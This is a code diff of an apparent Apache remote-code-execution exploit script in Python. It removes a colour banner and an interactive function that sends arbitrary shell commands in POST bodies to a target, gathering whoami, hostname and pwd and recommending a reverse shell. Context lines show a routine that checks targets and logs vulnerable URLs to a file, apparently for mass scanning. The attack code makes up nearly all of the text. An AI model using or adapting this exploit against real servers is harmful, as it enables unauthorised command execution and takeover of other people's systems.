@@ -16,20 +16,8 @@ import re
 import sys
 import time
 import requests
-from colorama import Fore,Style
 
 
-header = '''\033[1;91m
-    
-     ▄▄▄       ██▓███   ▄▄▄       ▄████▄   ██░ ██ ▓█████     ██▀███   ▄████▄  ▓█████ 
-    ▒████▄    ▓██░  ██▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
-    ▒██  ▀█▄  ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███      ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
-    ░██▄▄▄▄██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄    ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
-    ▓█   ▓██▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
-    ▒▒   ▓▒█░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
-    ▒   ▒▒ ░░▒ ░       ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
-    ░   ▒   ░░         ░   ▒   ░         ░  ░░ ░   ░        ░░   ░ ░           ░ 
-''' + Style.RESET_ALL
 
 
 if len(sys.argv) < 2 :
@@ -41,22 +29,6 @@ def end():
     time.sleep(0.5)
     sys.exit(1)
 
-def commands(url,command,session):
-    directory = mute_command(url,'pwd')
-    user = mute_command(url,'whoami')
-    hostname = mute_command(url,'hostname')
-    advise = print(Fore.YELLOW + 'Reverse shell is advised (This isn\'t an interactive shell)')
-    command = input(f"{Fore.RED}╭─{Fore.GREEN + user}@{hostname}: {Fore.BLUE + directory}\n{Fore.RED}╰─{Fore.YELLOW}$ {Style.RESET_ALL}")    
-    command = f"echo; {command};"
-    req = requests.Request('POST', url=url, data=command)
-    prepare = req.prepare()
-    prepare.url = url  
-    response = session.send(prepare, timeout=5)
-    output = response.text
-    if 'clear' in command:
-        os.system('/usr/bin/clear')
-    if 'exit' in command:
-        end()
 
 def mute_command(url,command):
     session = requests.Session()
@@ -87,7 +59,7 @@ def exploitRCE(payload):
             with open('list.txt', 'a') as file:
                 file.write(url+"\n")    
         else :
-            print(Fore.RED + '\nTarget %s isn\'t vulnerable' % host)
+            print('\nTarget %s isn\'t vulnerable' % host)
     except KeyboardInterrupt:
         end()
 
